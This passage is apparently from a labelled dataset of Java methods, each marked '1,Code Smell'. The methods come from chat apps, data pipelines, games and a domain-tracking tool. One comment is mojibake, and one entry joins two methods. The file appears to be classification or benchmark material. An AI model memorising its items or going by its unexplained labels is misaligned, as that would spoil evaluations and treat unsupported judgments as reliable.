      path.curveTo(points[i + 1],points[i + 2],points[i + 3],points[i + 4],points[i + 5],points[i + 6]);
      i+=7;
    }
 else     if (p == ROUNDED) {
      double x=points[i + 1];
      double y=points[i + 2];
      double arc=points[i + 3];
      int ip2=i + 4;
      if (points[ip2] == QUAD_TO || points[ip2] == ROUNDED)       ip2++;
      Point2D p1=path.getCurrentPoint();
      double x1=p1.getX();
      double y1=p1.getY();
      double x2=points[ip2];
      double y2=points[ip2 + 1];
      double d1=distance(x,y,x1,y1);
      double d2=distance(x,y,x2,y2);
      double t1=1 - ((1 / d1) * arc);
      double t2=(1 / d2) * arc;
      path.lineTo(lerp(x1,x,t1),lerp(y1,y,t1));
      path.quadTo(x,y,lerp(x,x2,t2),lerp(y,y2,t2));
      i+=4;
    }
 else     if (p == CLOSE_PATH) {
      path.closePath();
      i+=1;
    }
 else {
      path.lineTo(p,points[i + 1]);
      i+=2;
    }
  }
  if (close)   path.closePath();
  return path;
}",1,Code Smell
"public static void goToPulledDialog(BaseFragment fragment,PulledDialog dialog){
  if (dialog == null) {
    return;
  }
  if (dialog.activity == ChatActivity.class) {
    Bundle bundle=new Bundle();
    if (dialog.chat != null) {
      bundle.putLong(""chat_id"",dialog.chat.id);
    }
 else     if (dialog.user != null) {
      bundle.putLong(""user_id"",dialog.user.id);
    }
    bundle.putInt(""dialog_folder_id"",dialog.folderId);
    bundle.putInt(""dialog_filter_id"",dialog.filterId);
    fragment.presentFragment(new ChatActivity(bundle),true);
  }
 else   if (dialog.activity == ProfileActivity.class) {
    Bundle bundle=new Bundle();
    bundle.putLong(""dialog_id"",dialog.dialogId);
    fragment.presentFragment(new ProfileActivity(bundle),true);
  }
  if (dialog.activity == TopicsFragment.class) {
    Bundle bundle=new Bundle();
    bundle.putLong(""chat_id"",dialog.chat.id);
    fragment.presentFragment(new TopicsFragment(bundle),true);
  }
  if (dialog.activity == DialogsActivity.class) {
    fragment.presentFragment(new DialogsActivity(null),true);
  }
}
",1,Code Smell
"public void tick(Level world){
  for (  SoulPulseEffect pulse : pulses) {
    List<BlockPos> spawns=pulse.tick(world);
    if (spawns == null)     continue;
    if (pulse.canOverlap()) {
      for (      BlockPos pos : spawns) {
        pulse.spawnParticles(world,pos);
      }
    }
 else {
      for (      BlockPos pos : spawns) {
        if (occupied.contains(pos))         continue;
        pulse.spawnParticles(world,pos);
        pulse.added.add(pos);
        occupied.add(pos);
      }
    }
  }
  for (  SoulPulseEffect pulse : pulses) {
    if (pulse.finished() && !pulse.canOverlap())     occupied.removeAll(pulse.added);
  }
  pulses.removeIf(SoulPulseEffect::finished);
}
",1,Code Smell
"public static int[][] adjacent(int numSeats,int[][] seatLayout){
  int numRows=seatLayout.length;
  int numCols=seatLayout[0].length;
  List<int[]> selectedSeats=new ArrayList<>();
  for (int i=0; i < numRows; i++) {
    for (int j=0; j < numCols; j++) {
      if (seatLayout[i][j] == 0) {
        int consecutiveSeats=0;
        for (int k=j; k < numCols; k++) {
          if (seatLayout[i][k] == 0) {
            consecutiveSeats++;
            if (consecutiveSeats == numSeats) {
              for (int l=k - numSeats + 1; l <= k; l++) {
                selectedSeats.add(new int[]{i,l});
              }
              break;
            }
          }
 else {
            consecutiveSeats=0;
          }
        }
        if (!selectedSeats.isEmpty()) {
          break;
        }
      }
    }
    if (!selectedSeats.isEmpty()) {
      break;
    }
  }
  if (CollUtil.isEmpty(selectedSeats)) {
    return null;
  }
  int[][] actualSeat=new int[numSeats][2];
  int i=0;
  for (  int[] seat : selectedSeats) {
    int row=seat[0] + 1;
    int col=seat[1] + 1;
    actualSeat[i][0]=row;
    actualSeat[i][1]=col;
    i++;
  }
  return actualSeat;
}",1,Code Smell
"public Collection<RecipeDescriptor> listRecipeDescriptors(){
  Map<String,List<Contributor>> recipeToContributors=new HashMap<>();
  Map<String,List<RecipeExample>> recipeToExamples=new HashMap<>();
  for (  ResourceLoader r : resourceLoaders) {
    if (r instanceof YamlResourceLoader) {
      recipeToContributors.putAll(r.listContributors());
      recipeToExamples.putAll(r.listRecipeExamples());
    }
 else     if (r instanceof ClasspathScanningLoader) {
      ClasspathScanningLoader classpathScanningLoader=(ClasspathScanningLoader)r;
      Map<String,List<Contributor>> contributors=classpathScanningLoader.listContributors();
      for (      String key : contributors.keySet()) {
        if (recipeToContributors.containsKey(key)) {
          recipeToContributors.get(key).addAll(contributors.get(key));
        }
 else {
          recipeToContributors.put(key,contributors.get(key));
        }
      }
      Map<String,List<RecipeExample>> examplesMap=classpathScanningLoader.listRecipeExamples();
      for (      String key : examplesMap.keySet()) {
        if (recipeToExamples.containsKey(key)) {
          recipeToExamples.get(key).addAll(examplesMap.get(key));
        }
 else {
          recipeToExamples.put(key,examplesMap.get(key));
        }
      }
    }
  }
  List<RecipeDescriptor> result=new ArrayList<>();
  for (  ResourceLoader r : resourceLoaders) {
    if (r instanceof YamlResourceLoader) {
      result.addAll((((YamlResourceLoader)r).listRecipeDescriptors(emptyList(),recipeToContributors,recipeToExamples)));
    }
 else {
      Collection<RecipeDescriptor> descriptors=r.listRecipeDescriptors();
      for (      RecipeDescriptor descriptor : descriptors) {
        if (descriptor.getContributors() != null && recipeToContributors.containsKey(descriptor.getName())) {
          descriptor.getContributors().addAll(recipeToContributors.get(descriptor.getName()));
        }
        if (descriptor.getExamples() != null && recipeToExamples.containsKey(descriptor.getName())) {
          descriptor.getExamples().addAll(recipeToExamples.get(descriptor.getName()));
        }
      }
      result.addAll(descriptors);
    }
  }
  return result;
}
",1,Code Smell
"@Override protected Image call() throws Exception {
  try {
    if (cam == null) {
      List<Webcam> webcams=Webcam.getWebcams(1,TimeUnit.MINUTES);
      if (webcams.isEmpty()) {
        throw new UnsupportedOperationException(""No camera available."");
      }
      cam=webcams.get(0);
      if (device != null) {
        for (        Webcam webcam : webcams) {
          if (webcam.getDevice().getName().equals(device.getName())) {
            cam=webcam;
          }
        }
      }
 else       if (Config.get().getWebcamDevice() != null) {
        for (        Webcam webcam : webcams) {
          if (webcam.getDevice().getName().equals(Config.get().getWebcamDevice())) {
            cam=webcam;
          }
        }
      }
      device=cam.getDevice();
      cam.setCustomViewSizes(resolution.getSize());
      cam.setViewSize(resolution.getSize());
      if (!Arrays.asList(cam.getWebcamListeners()).contains(listener)) {
        cam.addWebcamListener(listener);
      }
      opening.set(true);
      cam.open(true,delayCalculator);
      opening.set(false);
    }
    BufferedImage originalImage=cam.getImage();
    if (originalImage == null) {
      return null;
    }
    CroppedDimension cropped=getCroppedDimension(originalImage);
    BufferedImage croppedImage=originalImage.getSubimage(cropped.x,cropped.y,cropped.length,cropped.length);
    BufferedImage framedImage=getFramedImage(originalImage,cropped);
    Image image=SwingFXUtils.toFXImage(framedImage,null);
    updateValue(image);
    if (System.currentTimeMillis() > (lastQrSampleTime + QR_SAMPLE_PERIOD_MILLIS)) {
      readQR(originalImage,croppedImage);
      lastQrSampleTime=System.currentTimeMillis();
    }
    return image;
  }
  finally {
    opening.set(false);
  }
}",1,Code Smell
"/** 
 * Gets the  {@code InnerClasses} attribute out of a given{@link AttributeList}, if any, translating it to one or more of an {@code InnerClass},  {@code EnclosingClass}, or {@code MemberClasses} annotation.
 * @param thisClass {@code non-null;} type representing the class beingprocessed
 * @param attribs {@code non-null;} the attributes list to search in
 * @param needEnclosingClass whether to include an{@code EnclosingClass} annotation
 * @return {@code null-ok;} the converted list of annotations, if therewas an attribute to translate
 */
private static Annotations translateInnerClasses(CstType thisClass,AttributeList attribs,boolean needEnclosingClass){
  AttInnerClasses innerClasses=(AttInnerClasses)attribs.findFirst(AttInnerClasses.ATTRIBUTE_NAME);
  if (innerClasses == null) {
    return null;
  }
  InnerClassList list=innerClasses.getInnerClasses();
  int size=list.size();
  InnerClassList.Item foundThisClass=null;
  ArrayList<Type> membersList=new ArrayList<Type>();
  for (int i=0; i < size; i++) {
    InnerClassList.Item item=list.get(i);
    CstType innerClass=item.getInnerClass();
    if (innerClass.equals(thisClass)) {
      foundThisClass=item;
    }
 else     if (thisClass.equals(item.getOuterClass())) {
      membersList.add(innerClass.getClassType());
    }
  }
  int membersSize=membersList.size();
  if ((foundThisClass == null) && (membersSize == 0)) {
    return null;
  }
  Annotations result=new Annotations();
  if (foundThisClass != null) {
    result.add(AnnotationUtils.makeInnerClass(foundThisClass.getInnerName(),foundThisClass.getAccessFlags()));
    if (needEnclosingClass) {
      CstType outer=foundThisClass.getOuterClass();
      if (outer == null) {
        throw new Warning(""Ignoring InnerClasses attribute for an "" + ""anonymous inner class\n"" + ""("" + thisClass.toHuman() + "") that doesn't come with an\n""+ ""associated EnclosingMethod attribute. ""+ ""This class was probably produced by a\n""+ ""compiler that did not target the modern ""+ "".class file format. The recommended\n""+ ""solution is to recompile the class from ""+ ""source, using an up-to-date compiler\n""+ ""and without specifying any \""-target\"" type ""+ ""options. The consequence of ignoring\n""+ ""this warning is that reflective operations ""+ ""on this class will incorrectly\n""+ ""indicate that it is *not* an inner class."");
      }
      result.add(AnnotationUtils.makeEnclosingClass(foundThisClass.getOuterClass()));
    }
  }
  if (membersSize != 0) {
    StdTypeList typeList=new StdTypeList(membersSize);
    for (int i=0; i < membersSize; i++) {
      typeList.set(i,membersList.get(i));
    }
    typeList.setImmutable();
    result.add(AnnotationUtils.makeMemberClasses(typeList));
  }
  result.setImmutable();
  return result;
}",1,Code Smell
"@Override public void open(MetricConfig config){
  super.open(config);
  String host=config.getString(HOST.key(),HOST.defaultValue());
  int port=config.getInteger(PORT.key(),PORT.defaultValue());
  String clusterMode=config.getString(CLUSTER_MODE.key(),CLUSTER_MODE.defaultValue());
  String configuredJobName=config.getString(JOB_NAME.key(),JOB_NAME.defaultValue());
  boolean randomSuffix=config.getBoolean(RANDOM_JOB_NAME_SUFFIX.key(),RANDOM_JOB_NAME_SUFFIX.defaultValue());
  deleteOnShutdown=config.getBoolean(DELETE_ON_SHUTDOWN.key(),DELETE_ON_SHUTDOWN.defaultValue());
  groupingKey=parseGroupingKey(config.getString(GROUPING_KEY.key(),GROUPING_KEY.defaultValue()));
  if (host == null || host.isEmpty() || port < 1) {
    throw new IllegalArgumentException(""Invalid host/port configuration. Host: "" + host + "" Port: ""+ port);
  }
  Properties properties=System.getProperties();
  taskName=properties.getProperty(""taskName"",null);
  taskId=properties.getProperty(""taskId"",null);
  String jobNamePrefix="""";
  if (!StringUtils.isNullOrWhitespaceOnly(clusterMode) && clusterMode.toUpperCase().equals(ClusterMode.YARN.name())) {
    appId=System.getenv(""_APP_ID"");
    if (!StringUtils.isNullOrWhitespaceOnly(appId)) {
      jobNamePrefix=appId + ""_jobmanager"";
    }
 else {
      String pwd=System.getenv(""PWD"");
      String[] values=pwd.split(File.separator);
      String containerId="""";
      if (values.length >= 2) {
        appId=values[values.length - 2];
        containerId=values[values.length - 1];
      }
      jobNamePrefix=appId + ""_taskmanager_"" + containerId;
    }
  }
 else   if (!StringUtils.isNullOrWhitespaceOnly(clusterMode) && clusterMode.toUpperCase().equals(ClusterMode.K8S.name())) {
    Map<String,String> envs=System.getenv();
    appId=envs.get(""CLUSTER_ID"");
    if (""k8s"".equalsIgnoreCase(host)) {
      host=envs.get(""_HOST_IP_ADDRESS"");
      log.info(""the pod is on K8s cluster, the host ip is {}"",host);
    }
    if (appId != null) {
      String hostname=envs.get(""HOSTNAME"");
      if (hostname.contains(""taskmanager"")) {
        jobNamePrefix=appId + ""_taskmanager_"" + hostname;
      }
 else {
        jobNamePrefix=appId + ""_jobmanager"";
      }
    }
  }
 else {
    jobNamePrefix=configuredJobName;
  }
  if (randomSuffix) {
    this.jobName=jobNamePrefix + ""_"" + new AbstractID();
  }
 else {
    this.jobName=jobNamePrefix;
  }
  pushGateway=new PushGateway(host + ':' + port);
  log.info(""Configured PrometheusPushGatewayReporter with {host:{}, port:{}, jobName:{}, randomJobNameSuffix:{}, deleteOnShutdown:{}, groupingKey:{}}"",host,port,jobName,randomSuffix,deleteOnShutdown,groupingKey);
}",1,Code Smell
"public void eval(Object... keys) throws Exception {
  if (keys.length != keyNames.length) {
    throw new RuntimeException(""The length of lookUpKey and lookUpKeyVals is difference!"");
  }
  Row keyRow=buildCacheKey(keys);
  if (this.cache != null) {
    ConcurrentMap<Row,List<Row>> cacheMap=this.cache.asMap();
    int keyCount=cacheMap.size();
    List<Row> cacheRows=this.cache.getIfPresent(keyRow);
    if (CollectionUtils.isNotEmpty(cacheRows)) {
      for (      Row cacheRow : cacheRows) {
        collect(cacheRow);
      }
      return;
    }
  }
  for (int retry=1; retry <= maxRetries; retry++) {
    try {
      final KuduScanToken.KuduScanTokenBuilder scanTokenBuilder=client.newScanTokenBuilder(table);
      final Schema kuduTableSchema=table.getSchema();
      for (int i=0; i < keyNames.length; i++) {
        String keyName=keyNames[i];
        Object value=keys[i];
        final ColumnSchema column=kuduTableSchema.getColumn(keyName);
        KuduPredicate predicate=predicateComparator(column,value);
        scanTokenBuilder.addPredicate(predicate);
      }
      final List<KuduScanToken> tokenList=scanTokenBuilder.build();
      ArrayList<Row> rows=new ArrayList<>();
      for (      final KuduScanToken token : tokenList) {
        final List<LocatedTablet.Replica> replicas=token.getTablet().getReplicas();
        final String[] array=replicas.stream().map(replica -> replica.getRpcHost() + "":"" + replica.getRpcPort()).collect(Collectors.toList()).toArray(new String[replicas.size()]);
        final byte[] scanToken=token.serialize();
        final KuduScanner scanner=KuduScanToken.deserializeIntoScanner(scanToken,client);
        for (        RowResult rowResult : scanner) {
          final Row row=convertor(rowResult);
          if (cache != null) {
            rows.add(row);
          }
          collect(row);
        }
      }
      rows.trimToSize();
      if (cache != null) {
        cache.put(keyRow,rows);
      }
      break;
    }
 catch (    Exception e) {
      LOG.error(String.format(""Kudu scan error, retry times = %d"",retry),e);
      if (retry >= maxRetries) {
        throw new RuntimeException(""Execution of Kudu scan failed."",e);
      }
      try {
        Thread.sleep(1000L * retry);
      }
 catch (      InterruptedException e1) {
        throw new RuntimeException(e1);
      }
    }
  }
}",1,Code Smell
"private void buildPath(Cell[] grid,Cell start,Cell end,boolean allowDiags){
  int[] order=new int[this.width * this.length];
  for (int i=0; i < this.width * this.length; i++)   order[i]=i;
  int nextRandomSlot=0;
  boolean refreshPath=true;
  while (this.gaps > 0 || (this.gaps == 0 && refreshPath)) {
    Cell targetCell=null;
    int target=-1;
    if (this.gaps > 0) {
      do {
        int targetSlot=nextRandomSlot + this.pathrand.nextInt((this.width * this.length) - nextRandomSlot);
        target=order[targetSlot];
        order[targetSlot]=order[nextRandomSlot];
        order[nextRandomSlot]=target;
        nextRandomSlot++;
        targetCell=grid[target];
      }
 while (targetCell == start || targetCell == end);
      refreshPath|=targetCell.isOnOptimalPath;
      grid[target]=null;
    }
    if (refreshPath) {
      for (int i=0; i < this.width * this.length; i++) {
        if (grid[i] != null) {
          grid[i].dist=this.width * this.length;
          grid[i].isOnOptimalPath=false;
          grid[i].predecessor=null;
        }
      }
      start.dist=0;
      start.isOnOptimalPath=true;
      end.isOnOptimalPath=true;
      ArrayList<Cell> queue=new ArrayList<Cell>();
      queue.add(start);
      while (!queue.isEmpty() && queue.get(0) != end) {
        Cell home=queue.remove(0);
        Cell[] neighbours=new Cell[8];
        int x=home.x;
        int z=home.z;
        populateNeighbours(grid,neighbours,x,z,allowDiags);
        for (int n=0; n < 8; n++) {
          if (neighbours[n] != null && neighbours[n].dist > home.dist + 1) {
            queue.add(neighbours[n]);
            neighbours[n].dist=home.dist + 1;
            neighbours[n].predecessor=home;
          }
        }
      }
      int pathLength=end.dist + 1;
      if (pathLength <= this.maxPathLength) {
        Cell c=end;
        while (c != start) {
          c.isOnOptimalPath=true;
          c=c.predecessor;
        }
        this.gaps--;
        refreshPath=false;
      }
 else       if (this.gaps > 0) {
        grid[target]=targetCell;
      }
    }
 else {
      this.gaps--;
    }
  }
}",1,Code Smell
"public boolean isSupportGenerate(String table){
  if (table == null || table.isEmpty()) {
    return true;
  }
  if (unGenerateTables != null) {
    for (    String unGenerateTable : unGenerateTables) {
      String regex=unGenerateTable.replace(""*"","".*"");
      if (table.matches(regex)) {
        return false;
      }
    }
  }
  if (generateTables == null || generateTables.isEmpty()) {
    return true;
  }
  for (  String generateTable : generateTables) {
    String regex=generateTable.replace(""*"","".*"");
    if (table.matches(regex)) {
      return true;
    }
  }
  return false;
}
",1,Code Smell
"@SuppressLint(""NewApi"") private void addProxy(){
  BottomBuilder builder=new BottomBuilder(getParentActivity());
  builder.addItems(new String[]{LocaleController.getString(""AddProxySocks5"",R.string.AddProxySocks5),LocaleController.getString(""AddProxyTelegram"",R.string.AddProxyTelegram),LocaleController.getString(""AddProxyWs"",R.string.AddProxyWs),BuildVars.isMini ? null : LocaleController.getString(""AddProxyVmess"",R.string.AddProxyVmess),BuildVars.isMini ? null : LocaleController.getString(""AddProxyTrojan"",R.string.AddProxyTrojan),BuildVars.isMini || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP ? null : LocaleController.getString(""AddProxySS"",R.string.AddProxySS),BuildVars.isMini || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP ? null : LocaleController.getString(""AddProxySSR"",R.string.AddProxySSR),LocaleController.getString(""ImportProxyFromClipboard"",R.string.ImportProxyFromClipboard),LocaleController.getString(""ScanQRCode"",R.string.ScanQRCode)},null,(i,t,c) -> {
    if (i == 0) {
      presentFragment(new ProxySettingsActivity(0));
    }
 else     if (i == 1) {
      presentFragment(new ProxySettingsActivity(1));
    }
 else     if (i == 2) {
      presentFragment(new WsSettingsActivity());
    }
 else     if (i == 3) {
      presentFragment(new VmessSettingsActivity());
    }
 else     if (i == 4) {
      presentFragment(new TrojanSettingsActivity());
    }
 else     if (i == 5) {
      presentFragment(new ShadowsocksSettingsActivity());
    }
 else     if (i == 6) {
      presentFragment(new ShadowsocksRSettingsActivity());
    }
 else     if (i == 7) {
      ProxyUtil.importFromClipboard(getParentActivity());
    }
 else {
      if (Build.VERSION.SDK_INT >= 23) {
        if (getParentActivity().checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
          getParentActivity().requestPermissions(new String[]{Manifest.permission.CAMERA},22);
          return Unit.INSTANCE;
        }
      }
      CameraScanActivity.showAsSheet(this,new CameraScanActivity.CameraScanActivityDelegate(){
        @Override public void didFindQr(        String text){
          try {
            HttpUrl.parse(text);
            Browser.openUrl(getParentActivity(),text);
            return;
          }
 catch (          Exception ignored) {
          }
          AlertUtil.showCopyAlert(getParentActivity(),text);
        }
      }
);
    }
    return Unit.INSTANCE;
  }
);
  builder.show();
}",1,Code Smell
"/** 
 * 瀹℃壒鏃� 閫夋嫨topic鎵�鍦ㄩ泦缇� 鍚屾椂鍙互閫夋嫨鎬ф敼鍙樼敤鎴疯缃殑partition鍜宺eplicas
 * @return
 */
@PostMapping(""/approve"") public RestResponse approve(@RequestBody Map<String,String> queryMap){
  Integer partition=Integer.valueOf(queryMap.get(TopicConfig.PARTITION));
  Short replication=Short.valueOf(queryMap.get(TopicConfig.REPLICATION));
  String clusterIds=queryMap.get(Constants.KeyStr.LOWER_CLUSTER_ID);
  Long id=Long.valueOf(queryMap.get(Constants.JsonObject.ID));
  try {
    TaskInfo task=taskInfoService.queryById(id);
    if (!taskInfoService.checkTopicIsExist(task,clusterIds)) {
      task.setClusterIds(clusterIds);
      task.setPartition(partition);
      task.setReplication(replication);
      taskInfoService.update(task);
      if (task.getApproved() == 0) {
        JSONObject obj=topicInfoService.encapsulatedObject(task);
        if (!obj.getBooleanValue(Constants.TRUE)) {
          return ERROR(obj.getString(Constants.KeyStr.MESSAGE));
        }
        UserInfo user=getCurrentUser();
        if (user != null) {
          task.setApprovedId(user.getId());
        }
        task.setApproved(CHECK);
        task.setApprovedTime(new Date());
        if (taskInfoService.update(task)) {
          if (mailEnable) {
            Map<String,Object> emailMap=taskInfoService.getSendEmailInfo(task,3);
            emailService.renderTemplateAndSend(emailMap.get(""emailEntity""),emailMap.get(""emailContent""),3);
          }
          return SUCCESS(""Approve task success, the topic will be create."");
        }
 else {
          return ERROR(""Approve task failed."");
        }
      }
 else {
        return ERROR(""This task have already processed."");
      }
    }
 else {
      return ERROR(""task is not exit."");
    }
  }
 catch (  Exception e) {
    LOG.error(""Approve task error."",e);
    if (null == e.getMessage()) {
      return ERROR(""Approve task failed"");
    }
 else {
      return ERROR("" Approve task failed : "" + e.getMessage());
    }
  }
}",1,Code Smell
"private void visit(HSQLDBJoin join){
  visit(join.getLeftTable());
  sb.append("" "");
  sb.append(join.getJoinType());
  sb.append("" "");
  if (join.getOuterType() != null) {
    sb.append(join.getOuterType());
  }
  sb.append("" JOIN "");
  visit(join.getRightTable());
  if (join.getOnCondition() != null) {
    sb.append("" ON "");
    visit(join.getOnCondition());
  }
}
private void visit(HSQLDBConstant constant){
  sb.append(constant.toString());
}
private void visit(HSQLDBSelect select){
  sb.append(""SELECT "");
  if (select.isDistinct()) {
    sb.append(""DISTINCT "");
  }
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getGroupByExpressions().isEmpty()) {
    sb.append("" GROUP BY "");
    visit(select.getGroupByExpressions());
  }
  if (select.getHavingClause() != null) {
    sb.append("" HAVING "");
    visit(select.getHavingClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}
",1,Code Smell
"MemoryPoolSummary extractPermOrMetaspaceRecord(String line){
  GCLogTrace trace;
  MemoryPoolSummary metaDataPool=null;
  if ((trace=PERM_SPACE_RECORD.parse(line)) != null) {
    String recordType=trace.getGroup(1).trim();
switch (recordType) {
case ""CMS Perm"":
case ""PS Perm"":
case ""PSPermGen"":
case ""Perm"":
      metaDataPool=extractPermGenRecord(trace);
    break;
case ""Metaspace"":
  if (trace.getGroup(2) != null) {
    metaDataPool=new MetaspaceRecord(trace.toKBytes(2),trace.toKBytes(4),trace.toKBytes(6));
  }
 else {
    metaDataPool=new MetaspaceRecord(trace.toKBytes(4),trace.toKBytes(4),trace.toKBytes(6));
  }
break;
}
}
 else if ((trace=META_SPACE_RECORD.parse(line)) != null) {
int index=(trace.getGroup(1) == null) ? 1 : 3;
metaDataPool=new MetaspaceRecord(trace.toKBytes(index),trace.toKBytes(3),trace.toKBytes(5));
}
return metaDataPool;
}",1,Code Smell
"@Override public void mouseClicked(MouseEvent e){
  SortOrder sortedMethod;
  try {
    getRowSorter().getSortKeys().get(0).getColumn();
    sortedMethod=getRowSorter().getSortKeys().get(0).getSortOrder();
    System.out.println(sortedMethod);
  }
 catch (  Exception e1) {
    sortedMethod=null;
    e1.printStackTrace(stderr);
  }
}
@Override public void mouseClicked(MouseEvent e){
  if (SwingUtilities.isLeftMouseButton(e) && e.getClickCount() == 2) {
    int[] rows=SelectedRowsToModelRows(getSelectedRows());
    int col=((TargetTable)e.getSource()).columnAtPoint(e.getPoint());
    int modelCol=TargetTable.this.convertColumnIndexToModel(col);
    TargetEntry selecteEntry=getTargetModel().getTargetEntries().get(rows[0]);
    if (modelCol == TargetTableModel.getTitleList().indexOf(""TrustLevel"")) {
      selecteEntry.switchTrustLevel();
      guiMain.getDomainPanel().getTargetDao().addOrUpdateTarget(selecteEntry);
      getTargetModel().fireTableRowsUpdated(rows[0],rows[0]);
    }
 else     if (modelCol == TargetTableModel.getTitleList().indexOf(""Domain/Subnet"")) {
      try {
        if (!selecteEntry.getType().equals(TargetEntry.Target_Type_Subnet)) {
          String domain=selecteEntry.getTarget();
          if (domain != null && !domain.toLowerCase().startsWith(""http://"") && !domain.toLowerCase().startsWith(""https://"")) {
            domain=""http://"" + domain;
          }
          SystemUtils.browserOpen(domain,ConfigManager.getStringConfigByKey(ConfigName.BrowserPath));
        }
      }
 catch (      Exception e1) {
        e1.printStackTrace(stderr);
      }
    }
 else     if (modelCol == TargetTableModel.getTitleList().indexOf(""DigDone"")) {
      selecteEntry.setDigDone(!selecteEntry.isDigDone());
      getTargetModel().fireTableRowsUpdated(rows[0],rows[0]);
    }
  }
  if (SwingUtilities.isLeftMouseButton(e) && e.getClickCount() == 1) {
    int row=((TargetTable)e.getSource()).rowAtPoint(e.getPoint());
    int col=((TargetTable)e.getSource()).columnAtPoint(e.getPoint());
    if (row > TargetTable.this.getRowCount() - 1 || row < 0) {
      return;
    }
    if (TargetTable.this.getColumnClass(col).equals(String.class)) {
      String value=(String)TargetTable.this.getValueAt(row,col);
      int modelCol=TargetTable.this.convertColumnIndexToModel(col);
      int headerLength=TargetTableModel.getTitleList().get(modelCol).length();
      if (value.length() > headerLength) {
        showToolTip(TargetTable.this,e.getPoint(),value);
      }
    }
  }
}",1,Code Smell
"public List<List<String>> accountsMerge(List<List<String>> accounts){
  Map<String,String> emailToName=new HashMap();
  Map<String,ArrayList<String>> graph=new HashMap();
  for (  List<String> account : accounts) {
    String name="""";
    for (    String email : account) {
      if (name == """") {
        name=email;
        continue;
      }
      graph.computeIfAbsent(email,x -> new ArrayList<String>()).add(account.get(1));
      graph.computeIfAbsent(account.get(1),x -> new ArrayList<String>()).add(email);
      emailToName.put(email,name);
    }
  }
  Set<String> seen=new HashSet();
  List<List<String>> ans=new ArrayList();
  for (  String email : graph.keySet()) {
    if (!seen.contains(email)) {
      seen.add(email);
      Stack<String> stack=new Stack();
      stack.push(email);
      List<String> component=new ArrayList();
      while (!stack.empty()) {
        String node=stack.pop();
        component.add(node);
        for (        String nei : graph.get(node)) {
          if (!seen.contains(nei)) {
            seen.add(nei);
            stack.push(nei);
          }
        }
      }
      Collections.sort(component);
      component.add(0,emailToName.get(email));
      ans.add(component);
    }
  }
  return ans;
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.chatInfoDidLoad) {
    TLRPC.ChatFull chatFull=(TLRPC.ChatFull)args[0];
    if (chatFull.participants != null && this.chatFull != null) {
      this.chatFull.participants=chatFull.participants;
    }
    if (chatFull.id == chatId) {
      updateChatInfo();
      if (pendingRequestsDelegate != null) {
        pendingRequestsDelegate.setChatInfo(chatFull,true);
      }
    }
  }
 else   if (id == NotificationCenter.storiesUpdated) {
    updateChatInfo();
  }
 else   if (id == NotificationCenter.chatWasBoostedByUser) {
    if (chatId == -(long)args[2]) {
      boostsStatus=(TL_stories.TL_premium_boostsStatus)args[0];
    }
  }
 else   if (id == NotificationCenter.topicsDidLoaded) {
    Long chatId=(Long)args[0];
    if (this.chatId == chatId) {
      updateTopicsList(false,true);
      if (args.length > 1 && (Boolean)args[1]) {
        checkForLoadMore();
      }
      checkLoading();
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    int mask=(Integer)args[0];
    if (mask == MessagesController.UPDATE_MASK_CHAT) {
      updateChatInfo();
    }
    if ((mask & MessagesController.UPDATE_MASK_SELECT_DIALOG) > 0) {
      getMessagesController().getTopicsController().sortTopics(chatId,false);
      boolean wasOnTop=!recyclerListView.canScrollVertically(-1);
      updateTopicsList(true,false);
      if (wasOnTop) {
        layoutManager.scrollToPosition(0);
      }
    }
  }
 else   if (id == NotificationCenter.dialogsNeedReload) {
    updateTopicsList(false,false);
  }
 else   if (id == NotificationCenter.groupCallUpdated) {
    Long chatId=(Long)args[0];
    if (this.chatId == chatId) {
      groupCall=getMessagesController().getGroupCall(chatId,false);
      if (fragmentContextView != null) {
        fragmentContextView.checkCall(!fragmentBeginToShow);
      }
    }
  }
 else   if (id == NotificationCenter.notificationsSettingsUpdated) {
    updateTopicsList(false,false);
    updateChatInfo(true);
  }
 else   if (id == NotificationCenter.chatSwithcedToForum) {
  }
 else   if (id == NotificationCenter.closeChats) {
    removeSelfFromStack(true);
  }
  if (id == NotificationCenter.openedChatChanged) {
    if (getParentActivity() == null || !(inPreviewMode && AndroidUtilities.isTablet())) {
      return;
    }
    boolean close=(Boolean)args[2];
    long dialog_id=(Long)args[0];
    long topicId=(Long)args[1];
    if (dialog_id == -chatId && !close) {
      if (selectedTopicForTablet != topicId) {
        selectedTopicForTablet=topicId;
        updateTopicsList(false,false);
      }
    }
 else {
      if (selectedTopicForTablet != 0) {
        selectedTopicForTablet=0;
        updateTopicsList(false,false);
      }
    }
  }
}",1,Code Smell
"@Override public Result<V> save(V entityVo){
  E entity=CopyUtil.copy(entityVo,entityClass);
  E entityFull=entity;
  List<String> ignoreProperties=new ArrayList<>(5);
  try {
    boolean isInsert=false;
    for (    Field field : entity.getClass().getDeclaredFields()) {
      field.setAccessible(true);
      String fieldName=field.getName();
      Object fieldValue=field.get(entity);
      if (field.isAnnotationPresent(Id.class)) {
        if (!StringUtils.isEmpty(fieldValue)) {
          Optional<E> one=commonRepository.findById((T)fieldValue);
          if (one.isPresent()) {
            entityFull=one.get();
          }
        }
 else {
          fieldValue=UUIDUtil.getUuid();
          field.set(entity,fieldValue);
          isInsert=true;
        }
      }
      if (isInsert && ""createTime"".equals(fieldName) && StringUtils.isEmpty(fieldValue)) {
        fieldValue=new Date();
        field.set(entity,fieldValue);
      }
      if (""updateTime"".equals(fieldName) && StringUtils.isEmpty(fieldValue)) {
        fieldValue=new Date();
        field.set(entity,fieldValue);
      }
      if (null == fieldValue || field.isAnnotationPresent(NotFound.class)) {
        ignoreProperties.add(fieldName);
      }
    }
    BeanUtils.copyProperties(entity,entityFull,ignoreProperties.toArray(new String[0]));
  }
